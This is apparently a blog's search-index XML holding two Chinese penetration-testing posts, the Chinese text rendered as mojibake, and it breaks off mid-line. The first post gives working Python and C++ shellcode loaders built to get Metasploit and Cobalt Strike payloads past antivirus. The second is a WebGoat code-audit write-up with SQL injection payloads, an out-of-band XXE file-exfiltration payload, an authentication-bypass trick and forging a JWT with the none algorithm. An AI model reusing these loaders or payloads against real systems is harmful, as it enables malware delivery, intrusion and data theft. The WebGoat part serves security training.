<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ShellCodeåŠ è½½å™¨çš„æ¢ç´¢ä¸å­¦ä¹ ]]></title>
    <url>%2F2019%2F12%2F20%2FShellCode-Loader%2F</url>
    <content type="text"><![CDATA[ShellCode Loader å½“ç›®æ ‡æœºä¸Šå­˜åœ¨æ€è½¯æ—¶ï¼ŒMSF/CSé»˜è®¤ç”Ÿæˆçš„Payloadæå¤§æ¦‚ç‡ä¼šè¢«Killæ‰ï¼Œè¿™æ ·å°±å¾ˆéš¾å—äº†ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªèƒ½å…æ€åŠ è½½Payloadçš„ç¨‹åºäº†ï¼Œæ”»é˜²å‘æ¥éƒ½æ˜¯åŠ¨æ€çš„ï¼Œåªæœ‰æŠŠæ¡åŸç†è‡ªè¡Œè¡ç”Ÿæ‘¸ç´¢æ‰æ˜¯æ­£é“ã€‚ Pythonï¼Ÿä¸€å®šè¦ç”¨pyhtonå—ï¼Œä¸ºå•¥è¦ç”¨pythonå‘¢ï¼Ÿå®é™…ä¸Šctypeså‡½æ•°çš„åŸå‹éƒ½æ˜¯c++å‡½æ•°ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨pythonæ¥æ‰“åŒ…ï¼Œè€ƒè™‘åˆ°åé—¨è¯­è¨€ç¼–è¯‘è‡ªå¸¦çš„ä¸€äº›å…æ€å…‰ç¯. åŠ è½½å™¨è¿™ä¸ªä¸œè¥¿å¾ˆå¤šè¯­è¨€éƒ½å¯ä»¥å®ç°ï¼Œæ¯”å¦‚: [go-shellcode] https://github.com/brimstone/go-shellcode [c#] https://github.com/cribdragg3r/Simple-Loader c++ ä»¥ä¸Šä¸¾ä¾‹æœ‰éƒ¨åˆ†å¹¶ä¸å®Œå–„ï¼Œä½†ä½œæ¦‚å¿µéªŒè¯è¶³ä»¥ã€‚å†æ¥åº·åº·æœ€è¿‘ç½‘ä¸Šå…¬å¼€çš„å‡ ä¸ªä»£ç  # ä»…python2import ctypespayload = ""shellcode = bytearray(payload)ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1)) import ctypesshellcode = ""rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)ctypes.windll.kernel32.WaitForSingleObject(handle, -1) import ctypesbuf = ""#libc = CDLL('libc.so.6')PROT_READ = 1PROT_WRITE = 2PROT_EXEC = 4def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception("Failed to allocate memory") memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception("Failed to set protection on buffer") return addrVirtualAlloc = ctypes.windll.kernel32.VirtualAllocVirtualProtect = ctypes.windll.kernel32.VirtualProtectshellcode = bytearray(buf)whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 1: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd)memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)old = ctypes.c_long(1)VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode)))shell = cast(memorywithshell, CFUNCTYPE(c_void_p))shell() åŸç†éƒ½æ˜¯é€šè¿‡ctypesåº“åœ¨å†…å­˜æ³¨å…¥shellcodeï¼Œåªè¦é€šè¿‡pyinstallæ‰“åŒ…ä¸ºexe ï¼ˆå¯¹pyç‰ˆæœ¬æœ‰è¦æ±‚ï¼Œå¦åˆ™æŠ¥é”™ï¼Œå¦‚æˆ‘çš„3.7.3æŠ¥é”™äº†ï¼‰ ctypes[pythonå®˜æ–¹æ–‡æ¡£] https://docs.python.org/3/library/ctypes.html åœ¨å®˜æ–¹æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹åº”çš„æ•°æ®ç±»å‹ æå–ä¸€ä¸‹æ ¸å¿ƒå‡½æ•° VirtualAlloc(0, len(shellcode), 0x1000, 0x40)VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))CreateThread(0, 0, rwxpage, 0, 0, 0)WaitForSingleObject(handle, -1) VirtualAllocå¼•ç”¨ä¸€ä¸‹rcoilå¤§ä½¬çš„åŸè¯ Cobalt Strike æä¾›äº†ä¸¤ç§åœ¨è¿œç¨‹è¿›ç¨‹ä¸­åˆ†é…å†…å­˜å¹¶å°†æ•°æ®å¤åˆ¶åˆ°å…¶ä¸­çš„é€‰é¡¹ï¼Œè€Œå…¶ä¸­é»˜è®¤ä½¿ç”¨é¡¹å°±æ˜¯ä½¿ç”¨äº† VirtualAllocEx -&gt; WriteProcessMemory çš„ç»å…¸æ¨¡å¼ï¼Œè¿™æ¨¡å¼ä¹Ÿæ˜¯çº¢é˜Ÿå·¥å…·ä¸­æœ€å¸¸è§çš„æ¨¡å¼ã€‚æ­¤æ¨¡å¼ä¹Ÿé€‚ç”¨äºä¸åŒçš„è¿›ç¨‹ä½“ç³»ç»“æ„ã€‚ è€Œè¿™é‡Œçš„VirtualAllocä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¸è¿‡VirtualAllocEx æ˜¯åœ¨å¦ä¸€ä¸ªè¿›ç¨‹åˆ†é…å†…å­˜VirtualAllocåˆ™åœ¨æœ¬è¿›ç¨‹ï¼Œå…¶å‡½æ•°åŸå‹ä¸º lpAddress è¦åˆ†é…çš„åŒºåŸŸçš„èµ·å§‹åœ°å€ dwSize è¦åˆ†é…çš„å¤§å°, ä»¥å­—èŠ‚ä¸ºå•ä½ flAllocationType å†…å­˜åˆ†é…çš„ç±»å‹,å…·ä½“ç±»å‹ç§ç±»å¯ä»¥è‡ªè¡ŒæŸ¥çœ‹ https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN flProtect å¯¹è¦åˆ†é…çš„é¡µé¢åŒºåŸŸçš„å†…å­˜ä¿æŠ¤ RtlMoveMemory å°†æºå†…å­˜å—çš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡å†…å­˜å— VOID RtlMoveMemory( _Out_ VOID UNALIGNED *Destination, _In_ const VOID UNALIGNED *Source, _In_ SIZE_T Length); Destination æŒ‡å‘è¦å¤åˆ¶å­—èŠ‚çš„ç›®æ ‡å­˜å‚¨å—çš„æŒ‡é’ˆã€‚ Source æŒ‡å‘è¦å¤åˆ¶å­—èŠ‚çš„ç›®æ ‡å­˜å‚¨å—çš„æŒ‡é’ˆã€‚ Lengthä»æºå¤åˆ¶åˆ°ç›®æ ‡çš„å­—èŠ‚æ•°ã€‚ VirualProtectBOOL VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect); flNewProtect å†…å­˜ä¿æŠ¤é€‰é¡¹ lpflOldProtect æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶é¡µé¢çš„æŒ‡å®šåŒºåŸŸä¸­ç¬¬ä¸€é¡µçš„å…ˆå‰è®¿é—®ä¿æŠ¤å€¼ã€‚ #ç¤ºä¾‹VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old)) CreateThread åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»¥åœ¨è°ƒç”¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å†…æ‰§è¡Œ HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); lpThreadAttributes æè¿°æ˜¯å¦å¯ä»¥ç”±å­è¿›ç¨‹ç»§æ‰¿ dwStackSize å †æ ˆçš„åˆå§‹å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ , å‚æ•°ä¸º0ï¼Œåˆ™ä½¿ç”¨å¯æ‰§è¡Œæ–‡ä»¶çš„é»˜è®¤å¤§å° (1MB) lpStartAddress è¯¥æŒ‡é’ˆè¡¨ç¤ºçº¿ç¨‹çš„èµ·å§‹åœ°å€ lpParameter æŒ‡å‘è¦ä¼ é€’ç»™çº¿ç¨‹çš„å˜é‡çš„æŒ‡é’ˆ dwCreationFlags æ§åˆ¶çº¿ç¨‹åˆ›å»ºçš„æ ‡å¿—ï¼Œ0ä¸ºåˆ›å»ºåç«‹å³æ‰§è¡Œ lpThreadId æŒ‡å‘æ¥æ”¶çº¿ç¨‹æ ‡è¯†ç¬¦çš„å˜é‡çš„æŒ‡é’ˆï¼Œä¸º NULLï¼Œåˆ™ä¸è¿”å›çº¿ç¨‹æ ‡è¯†ç¬¦ WaitForSingleObjectDWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); hHandle å¯¹è±¡çš„å¥æŸ„ dwMilliseconds è¶…æ—¶æ—¶é—´é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ç›´åˆ°å‘å‡ºä¿¡å·é€šçŸ¥å¯¹è±¡æˆ–é—´éš”è¿‡å» C++åŸå‹å¾ˆæ˜¾ç„¶è¿™äº›åŠ è½½å™¨çš„è¿‡ç¨‹éƒ½æ˜¯å¤§åŒå°å¼‚ï¼Œæ ¸å¿ƒå°±æ˜¯ä»¥ä¸‹æµç¨‹ é€šè¿‡VirtualAlloc \ VirtualAllocExåˆ†é…å†…å­˜ é€šè¿‡RtlMoveMemory \ RtlCopyMemoryå°†Shellcodeå¤åˆ¶æˆ–ç§»åŠ¨åˆ°å·²åˆ†é…å†…å­˜ä¸­ï¼ˆC++ä¸­å¯ç®€å†™ä¸ºmemcpy\memoveï¼‰ ä½¿ç”¨CreateThreadåœ¨å­çº¿ç¨‹ä¸­è¿è¡Œ å½“ç„¶å¦‚æœä½¿ç”¨VirtualAllocExå°±ä¸éœ€è¦ä½¿ç”¨CreateThreadäº† è¿™é‡Œè´´ä¸€ä¸‹è¿™äº›å˜å½¢å‡½æ•°çš„c++åŸå‹ #include "stdio.h"#include "windows.h"#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//è¿è¡Œä¸æ˜¾ç¤ºçª—å£//è¿™é‡Œæ”¾shellcodeunsigned char buf[] = "";void run(void* buffer) &#123; void(*function)(); function = (void (*)())buffer; function();&#125;void main()&#123; LPVOID ptr = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); RtlMoveMemory(ptr, buf, sizeof(buf)); LPVOID ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&amp;run, ptr, 0, NULL); WaitForSingleObject(ht, -1);&#125; PS:è¿™ä¸ªåŸå‹æ¨¡æ¿ç¼–è¯‘å‡ºæ¥çš„exeå·²ç»è¢«ä¸»æµæ€è½¯æ€æ‰äº†ï¼Œè¿™é‡Œé„™è§†ä¸‹360ã€‚åŸå› ä½ æ‡‚çš„ å°ç»“è¯´ç‚¹é¢˜å¤–è¯ï¼Œcobaltstrike4.0ä¸­ï¼Œæ ¹æ®å…¶å±•ç¤ºçš„è§†é¢‘ï¼Œä½œè€…å°†VirtualAllocæ›¿æ¢ä¸ºäº†HeadCreate ByPassäº†Win10çš„Defenderã€‚]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>æ€è½¯å¯¹æŠ—</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»WebGoatå­¦ä¹ Javaä»£ç å®¡è®¡]]></title>
    <url>%2F2019%2F04%2F20%2FCodeAudit-Java-Webgoat%2F</url>
    <content type="text"><![CDATA[è¯´åœ¨å‰é¢çš„è¯ è¡¥ä¸€ä¸‹ä»¥å‰æŒ–çš„å‘ï¼Œå¥½å¤šå¿˜äº†ä¸Šä¼ â€¦ ä»¥å‰ç¡¬ç€å¤´çš®å•ƒäº†æœ¬phpä»£ç å®¡è®¡çš„ä¹¦ï¼Œæ„Ÿè§‰è¿˜æ˜¯javaå¥½ç©ï¼Œè¿™æ¬¡æ¥å­¦å­¦Javaå®¡è®¡ã€‚ ps:ç›®çš„æ˜¯ç†Ÿæ‚‰å„ç§æ¼æ´åœ¨Javaä¸‹çš„è¡¨ç°ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰æŒ‰ç€é€šå…³è¦æ±‚æ¥åšï¼Œåªæ˜¯ç‚¹åˆ°ä¸ºæ­¢ WebGoatç¯å¢ƒé…ç½® WebGoatæ˜¯ç”±OWASPç»´æŠ¤çš„åŸºäºJavaå¼€å‘çš„Webåº”ç”¨ç¨‹åºï¼Œä¸»è¦ç”¨äºå®‰å…¨æ•™å­¦ [å®˜æ–¹ç½‘ç«™] [é¡¹ç›®github] æ—¢ç„¶æ˜¯å¥”ç€ä»£ç å®¡è®¡æ¥çš„ï¼Œé‚£å½“ç„¶æ˜¯ä¸‹è½½æºä»£ç å•¦ã€‚ å…ˆå¯¼å…¥åˆ°ideaï¼Œ(å…³äºmavené…ç½®ç­‰å°±ä¸èµ˜è¿°äº†)ï¼Œå¯¼å…¥æˆåŠŸåmavenä¼šè‡ªåŠ¨è¿›è¡Œé…ç½®é¡¹ç›®é‡‡ç”¨äº†SpringBootï¼Œç›´æ¥è¿›å…¥Debugæ¨¡å¼ è®¿é—®localhost:8080/WebGoat æ³¨å†Œä¸ªç”¨æˆ·å°±å¯ä»¥ç™»å½•äº†é…ç½®å¥½åé»˜è®¤æ˜¯åªèƒ½ä»127.0.0.1è®¿é—®ï¼Œå¦‚æœæœ‰éœ€è¦å¯ä»¥æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œè¿›è¡Œä¿®æ”¹ webgoat-container/src/main/resources/application.properties ä»SQLIå¼€å§‹å®¡è®¡ä¹‹æ—…æ³¨å…¥ä¸­ç¬¬ä¸€é¡¹æ˜¯SQL Injection (advanced),å…ˆæµ‹è¯•æ³¨å†ŒåŠŸèƒ½é‚£ä¹ˆå…ˆä¸‹ä¸ªæ–­ç‚¹è·Ÿè¿›åˆ°å¯¹åº”ä¸šåŠ¡é€»è¾‘ç±»ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€å¤„å‚æ•°æ£€æŸ¥ ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°åªæ£€æŸ¥äº†æ˜¯å¦ä¸ºç©ºå’Œé•¿åº¦ï¼Œç„¶åå¯¹ç”¨æˆ·åè¿›è¡ŒæŸ¥é‡æ—¶ç›´æ¥å¸¦å…¥äº†å‚æ•°è€ŒæŸ¥é‡åçš„æ’å…¥æ•°æ®ä½¿ç”¨äº†é¢„ç¼–è¯‘é‰´äºè¿”å›åˆ°å‰ç«¯çš„å‚æ•°åªæœ‰user.createdå’Œuser.existsä¸¤ç§ã€‚åŸºæœ¬ç¡®è®¤ä¸ºç›²æ³¨ æ¼æ´éªŒè¯å¦‚ä¸‹ï¼Œtomç”¨æˆ·æ˜æ˜æ˜¯å­˜åœ¨çš„ï¼Œä½†ç”¨æˆ·ä¾ç„¶åˆ›å»ºæˆåŠŸè¯æ˜payloadç”Ÿæ•ˆï¼Œand 1=2å¯¼è‡´æŸ¥è¯¢å‡ºçš„ç”¨æˆ·åä¸å­˜åœ¨ä»è€Œè¿›å…¥åˆ›å»ºæµç¨‹ é‚£ä¹ˆexpåº”è¯¥æ˜¯ tom'+and+if(ascii(substr(database(),1,1))&gt;100,SLEEP(10),NULL)--+ ç„¶è€ŒæŠ¥500é”™è¯¯ï¼Œsqlè¯­æ³•ä¸æ­£ç¡®ï¼Œè¿™æ˜¯å› ä¸ºé‡‡ç”¨çš„æ˜¯HSQLDBï¼Œå³javaå†…ç½®çš„æ•°æ®åº“IFå’ŒSLEEPè¯­å¥æ˜¯Mysqlçš„æ‰©å±•è¯­å¥ï¼Œemmm IFåº”è¯¥å¯ä»¥ä½¿ç”¨CASE WHEN THEN ELSE ENDä»£æ›¿ï¼ŒSLEEPæ²¡æœ‰æ‰¾åˆ°ä»£æ›¿çš„å‡½æ•°è¿™ä¸ªæ˜¯SQLmapç»™å‡ºçš„æ—¶é—´ç›²æ³¨payloadï¼Œæˆ‘æ²¡çœ‹æ‡‚â€¦ä¼¼ä¹æ˜¯é‡å¤æŸ¥è¯¢å¤šæ¬¡è¾¾åˆ°å»¶æ—¶çš„æ ·å­ username_reg=tom' AND CHAR(87)||CHAR(90)||CHAR(97)||CHAR(110)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND 'zDag'='zDag&amp;email_reg=a@gmail.com&amp;password_reg=123&amp;confirm_password_reg=123 åæ¥å‘ç°å¯ä»¥ç›´æ¥å¸ƒå°”ç›²æ³¨ï¼Œtomè¿™ä¸ªç”¨æˆ·åæ˜¯å­˜åœ¨çš„ä¸ºtrueï¼Œåªè¦åé¢ä¸ºfalseå°±ä¼šè¿”å›user created tom'+and+ascii(substr(database(),1,1))&lt;100--+ SQLi-5a åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆå«è¿™ä¸ªå¥‡æ€ªçš„åå­—ï¼Œè¿™æ˜¯ç±»åâ€¦. æ ¹æ®formä¸­çš„urlæœç´¢åˆ°å¯¹åº”ç±» unionï¼Œå †æ³¨å…¥,and/oréƒ½å¯ä»¥å¦ä¸€ä¸ªæ˜¯æ•°å­—å‹æ³¨å…¥SQLi-5bConnection connection = DatabaseUtilities.getConnection(getWebSession());String query = "SELECT * FROM user_data WHERE userid = " + accountName;try &#123; ... ResultSet results = statement.executeQuery(query); ...&#125; åŒä¸Šçš„åˆ©ç”¨æ–¹æ³• SQLi-6aè·Ÿ5açš„åˆ©ç”¨ç›¸åŒ String query = "SELECT * FROM user_data WHERE last_name = '" + accountName + "'"; XXE-SimpleXXEtry &#123; Comment comment = comments.parseXml(commentStr); comments.addComment(comment, false); if (checkSolution(comment)) &#123; return trackProgress(success().build()); &#125;&#125; catch (Exception e) &#123; error = ExceptionUtils.getFullStackTrace(e);&#125; å…ˆçœ‹ä¸€ä¸‹commnetç±» public class Comment &#123; private String user; private String dateTime; private String text;&#125; ç»§ç»­è·Ÿè¿›parseXml å¯ä»¥çœ‹åˆ°SUPPORT_DTDè®¾ä¸ºäº†true,å³å¯ç”¨äº†å®ä½“å¼•ç”¨ åŒæ—¶IS_SUPPORTING_EXTERNAL_ENTITIESè®¾ä¸ºäº†trueï¼Œå¯ç”¨äº†å¤–éƒ¨å®ä½“å¼•ç”¨ åœ¨dç›˜æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶hack.md ps:file:///ä¸åŠ ä»»ä½•æ–‡ä»¶åå¯ä»¥åˆ—ç›®å½• æŠ“åŒ…å°†xmlåšä¸€äº›ä¿®æ”¹ï¼Œé€šè¿‡å¤–éƒ¨å®ä½“è¯»å–æ–‡ä»¶ï¼Œå¹¶æ›¿æ¢åˆ°è¾“å‡ºç‚¹textä¸­ï¼Œåˆ·æ–°é¡µé¢ XXE-Jsonå¯è§postçš„è¡¨å•åŒæ—¶æ”¯æŒjsonï¼Œxmlï¼Œä¸”é»˜è®¤ä½¿ç”¨jsonä¼ è¾“ å°è¯•å¯¹HTTPå¤´ä¸­çš„content-typeè¿›è¡Œä¿®æ”¹ï¼ŒæŒ‡å®šä¸ºxml Content-Type: application/xml ä½¿ä¹‹è¿›å…¥parseXmlæµç¨‹ï¼ŒæˆåŠŸè§¦å‘XXEæ¼æ´ Blind-XXEstatic final String CONTENTS = "WebGoat 8.0 rocks... (" + randomAlphabetic(10) + ")";......@RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)@ResponseBodypublic AttackResult addComment(@RequestBody String commentStr) throws Exception &#123; //Solution is posted as a separate comment if (commentStr.contains(CONTENTS)) &#123; return trackProgress(success().build()); &#125; try &#123; Comment comment = comments.parseXml(commentStr); comments.addComment(comment, false); &#125; catch (Exception e) &#123; return trackProgress(failed().output(e.toString()).build()); &#125; return trackProgress(failed().build());&#125; å½“è·å–å€¼åŒ…å«è¦è¯»å–çš„å­—ç¬¦ä¸²æ—¶ï¼Œæ‰§è¡Œreturn é¢„æœŸè§£æ³•åº”è¯¥æ˜¯ä½¿ç”¨å¸¦å¤–é€šé“æ¥å›æ˜¾ ä½†æˆ‘é€šè¿‡åŸæ–¹æ³•è¿›è¡Œè¯»å–ï¼Œå¹¶æ²¡æœ‰æ‹¦æˆªåˆ° ä»”ç»†ä¸€æƒ³â€¦payloadç¡®å®ä¸åŒ…å«WebGoat 8.0 rocks... (...è¿™ä¸ªå­—ç¬¦ä¸²å•Š,è€Œä¸”ä¸ºå•¥ä¼šåŒ…å«å•Š é™·å…¥æ²‰æ€â€¦ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY % file SYSTEM &quot;file:///c:/windows-version.txt&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://localhost:9090/ping?text=%file;&apos;&gt;&quot;&gt; %all; ä»¥ä¸Šæ˜¯é¢„æœŸè§£ Authentication Bypasses public boolean didUserLikelylCheat(HashMap&lt;String,String&gt; submittedAnswers) &#123; boolean likely = false; if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123; likely = true;&#125;if ((submittedAnswers.containsKey("secQuestion0") &amp;&amp; submittedAnswers.get("secQuestion0").equals(secQuestionStore.get(verifyUserId) .get("secQuestion0"))) &amp;&amp; (submittedAnswers.containsKey("secQuestion1") &amp;&amp; submittedAnswers.get("secQuestion1").equals(secQuestionStore.get(verifyUserId) .get("secQuestion1"))) ) &#123; likely = true; &#125; else &#123; likely = false; &#125; return likely; &#125; public boolean verifyAccount(Integer userId, HashMap&lt;String,String&gt; submittedQuestions ) &#123; //short circuit if no questions are submitted if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123; return false; &#125; if (submittedQuestions.containsKey("secQuestion0") &amp;&amp; !submittedQuestions.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) &#123; return false; &#125; if (submittedQuestions.containsKey("secQuestion1") &amp;&amp; !submittedQuestions.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) &#123; return false; &#125; // else return true;&#125; ç®€å•æ¥è¯´å°±æ˜¯æäº¤ä¸¤ä¸ªå‚æ•°secQuestion0,secQuestion1åˆ¤æ–­æ˜¯å¦ä¸è®¾å®šçš„ç›¸ç­‰ç›¸ç­‰åˆ¤æ–­ä¸ºä½œå¼Šâ€¦è¿”å›å¤±è´¥ä¸ç›¸ç­‰åˆ™è¿›è¡Œä¸‹æ¬¡æ¯”è¾ƒï¼Œä½†è¿™æ¬¡åˆè¦æ±‚ç›¸ç­‰æ‰è¿”å›æˆåŠŸâ€¦éå¸¸æœ‰CTFå‘³é“çš„ä¸€é“é¢˜emmm Map &lt;String,String&gt; userAnswers = new HashMap&lt;&gt;();List&lt;String&gt; paramNames = Collections.list(req.getParameterNames());for (String paramName : paramNames) &#123; //String paramName = req.getParameterNames().nextElement(); if (paramName.contains("secQuestion")) &#123; userAnswers.put(paramName,req.getParameter(paramName)); &#125;&#125;return (HashMap)userAnswers; ä»”ç»†ä¸€çœ‹ï¼Œå‚æ•°çš„ä¼ é€’å¹¶ä¸æ˜¯é€šè¿‡@RequestParamæŒ‡å®šçš„ è€Œä¸”åˆ¤æ–­å‚æ•°æ—¶åªåˆ¤æ–­äº†æ˜¯å¦åŒ…å«SecQuestionå­—æ®µå¯ä»¥ç¯¡æ”¹å‚æ•°secQuestion0ä¸ºsecQuestion2ä»¥åŠsecQuestion1ä¸ºsecQuestion3ï¼Œè¾¾åˆ°ç»•è¿‡ç›®çš„ è¿™é‡Œå±•ç°äº†ä¸€å¤„ç”±é€»è¾‘æ¼æ´å¼•å‘çš„èº«ä»½éªŒè¯å¤±æ•ˆä¸è¶Šæƒé—®é¢˜ï¼Œæ¯”è¾ƒæœ‰æ„æ€ JWT tokens-4JSON WEB Tokenï¼ˆJWTï¼‰ï¼Œæ˜¯ä¸€ç§åŸºäºJSONçš„ã€ç”¨äºä»¤ç‰Œæ ‡è¯†ï¼ˆtokenï¼‰ è¿‘å¹´æ¥RESTful APIå¼€å§‹é£é¡ï¼Œä½¿ç”¨HTTP headeræ¥ä¼ é€’è®¤è¯ä»¤ç‰Œä¼¼ä¹å˜å¾—ç†æ‰€åº”å½“ï¼Œä½†æ˜¯å¾ˆå¤šå¼€å‘è€…è¯¯ç”¨äº†jwtï¼Œè¿™ä¸ªä¸œè¥¿ä¹Ÿæœ‰å®ƒçš„ç¼ºç‚¹ï¼Œæ¯”å¦‚ ä¸€æ—¦é¢å‘ç¥¨æ®ï¼Œå°±æ— æ³•ä½œåºŸã€‚ æ‰€æœ‰çš„è®¤è¯ä¿¡æ¯éƒ½åœ¨JWTä¸­ï¼Œç”±äºåœ¨æœåŠ¡ç«¯æ²¡æœ‰çŠ¶æ€ï¼Œå³ä½¿ä½ çŸ¥é“äº†æŸä¸ªJWTè¢«ç›—å–äº†ï¼Œä½ ä¹Ÿæ²¡æœ‰åŠæ³•å°†å…¶ä½œåºŸã€‚åœ¨JWTè¿‡æœŸä¹‹å‰ï¼ˆä½ ç»å¯¹åº”è¯¥è®¾ç½®è¿‡æœŸæ—¶é—´ï¼‰ï¼Œä½ æ— èƒ½ä¸ºåŠ›ã€‚ å­˜å‚¨é—®é¢˜ JWTçš„å­˜å‚¨é€‰é¡¹æœ‰local storageã€session storageå’Œcookie æ”¾åˆ°cookieæ„å‘³ç€ä¸èƒ½httponlyï¼Œäº§ç”Ÿäº†XSSé£é™© æ”¾åˆ°storageï¼Œå®‰å…¨é—®é¢˜æ›´åŠ ä¸¥é‡ã€‚ å¯è§JWTå…¶å®æ¯”è¾ƒé€‚åˆä¸€æ¬¡æ€§çš„å‘½ä»¤è®¤è¯ï¼Œè€Œä¸å¤ªé€‚ç”¨äºsession JWTæ„æˆJWTé€šå¸¸ç”±ä¸‰éƒ¨åˆ†ç»„æˆ: å¤´ä¿¡æ¯ï¼ˆheaderï¼‰, æ¶ˆæ¯ä½“ï¼ˆpayloadï¼‰å’Œç­¾åï¼ˆsignatureï¼‰ï¼Œç­¾åéƒ¨åˆ†ç”¨äºç¡®ä¿å‰ä¸¤ä¸ªæ•°æ®å—ä¸è¢«ç¯¡æ”¹ã€‚ access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NTgwMTUxNDksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg; å¯¹æŠ“åˆ°çš„è¯·æ±‚åŒ…çš„cookieè¿›è¡Œbase64è§£ç  &#123; "alg":"HS512"&#125;.&#123; "iat":1558015149, "admin":"false", "user":"Sylvester"&#125;.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg JWTçš„æ”»å‡»é¢ æœªæ ¡éªŒç­¾å ç¦ç”¨å“ˆå¸Œ å¯†é’¥æš´ç ´ å°è¯•ç¯¡æ”¹adminå€¼ï¼Œè‹¥æœåŠ¡ç«¯æ²¡æœ‰ä½œç­¾åæ ¡éªŒï¼Œå°†å¯¼è‡´ç›´æ¥è¶Šæƒã€‚ &#123;"alg":"HS512"&#125;.&#123;"iat":1558015149,"admin":"true","user":"Sylvester"&#125; In0.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg æˆ–è€…ä½¿ç”¨pyjwtç”Ÿæˆç©ºç­¾åçš„jwt token pip install pyjwtimport jwtjwt.encode(&#123;'iat': 1558015149, "admin":"true","user":"Sylvester"&#125;, algorithm='none', 